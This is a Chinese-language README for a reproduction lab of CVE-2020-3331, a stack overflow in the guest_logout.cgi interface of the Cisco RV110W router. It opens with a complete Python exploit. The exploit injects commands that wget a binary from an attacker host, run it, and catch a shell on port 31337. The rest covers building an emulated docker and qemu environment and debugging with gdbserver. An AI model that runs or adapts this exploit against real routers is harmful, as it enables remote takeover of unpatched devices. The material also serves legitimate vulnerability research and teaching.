# Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）

- 版本：Cisco RV110W 1.2.2.5
- 漏洞：前台 cgi 接口 `guest_logout.cgi` 栈溢出
- 利用：a0 寄存器可控，ret2system

```python
#!/usr/bin/python3

from pwn import *
import requests
from threading import Thread

context(arch='mips', endian='little', os='linux')

system = 0x0047A610

cmd  = '\n'
cmd += 'wget http://192.168.2.1:8000/tools/msf -O /msf\n'
cmd += 'chmod 777 /msf\n'
cmd += '/msf\n'

assert(len(cmd) < 0x55)

payload = b"status_guestnet.asp" + cmd.ljust(0x55,'a').encode() + p32(system) 
data = {"cmac":"12:af:aa:bb:cc:dd", "submit_button":payload, "cip":"192.168.100.1"}

def attack():
    try:
        requests.post("http://192.168.2.2/guest_logout.cgi", data=data, timeout=1)
    except Exception as e:
        print(e)

thread = Thread(target=attack)
thread.start()

io = listen(31337)
io.wait_for_connection()
log.success("getshell")
io.interactive()

thread.join()
```

## 漏洞环境

- docker：攻击、调试主机：192.168.2.1
- qemu-system：固件主机：192.168.2.2
- httpd（有漏洞 Web 服务器）：192.168.2.2:80
- 镜像依赖：`firmianay/ubuntu1604 -> firmianay/qemu-system:mipsel`

使用 `firmianay/binwalk` 解压固件：

```sh
$ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer "/root/firmware/RV110W_FW_1.2.2.5.bin"
```

构建并启动漏洞环境：

```sh
# 初始化环境
$ ./init_env.sh mipsel

# 构建镜像
$ docker-compose -f docker-compose-system.yml build

# 启动容器
$ docker-compose -f docker-compose-system.yml up
```

## 首次攻击尝试

启动完成后再开一个 shell，尝试首次攻击：

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ python3 ./tools/exp.py
```

## docker 中调试

参考 `run.sh` 进行配置。

窗口一：开启调试（qemu-system shell）

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ cd images
root@7463bb44fe27:$ ps -ef | grep qemu-system  | awk '{print $2}' | xargs kill -9
root@7463bb44fe27:$ qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

即可进入 qemu-system，以 root:root 手动登录后进行调试：

root@debian-mipsel:$ cd squashfs-root/
root@debian-mipsel:$ ./tools/run_httpd.sh
root@debian-mipsel:$ ps -ef | grep httpd | grep -v 'grep' | awk '{print $2}' | xargs ./tools/gdbserver :6666 --attach
Attached; pid = 2328
Listening on port 6666
```

窗口二：调试界面（docker shell）

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ tar xzf squashfs-root.tar.gz
root@7463bb44fe27:$ gdb-multiarch -x ./tools/gdb.cmd 
gef➤  c
```

窗口三：触发漏洞（docker shell）

```sh
$ docker exec -it cisco-system /bin/bash

root@7463bb44fe27:$ python3 ./tools/exp.py
```

## 本机调试

如果你不想用 docker 进行调试，在 docker-compose 中预留了端口映射，可以手动使用 ssh 将 qemu 靶机的 80 和 6666 端口转发到 docker 主机，通过 docker 最终映射到宿主机的端口上：

```yml
ports:
    - "8888:80"
    - "6666:6666"
```

在 docker 里执行如下命令进行端口转发：

```sh
$ ssh root@127.0.0.1 -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666
$ ssh root@127.0.0.1 -f -N -g -R 0.0.0.0:80:192.168.2.2:80
```

待启动调试后，即可在宿主机上访问 8888 和 6666 端口来访问漏洞服务和 gdbserver 了。

## 参考链接

- <https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w>
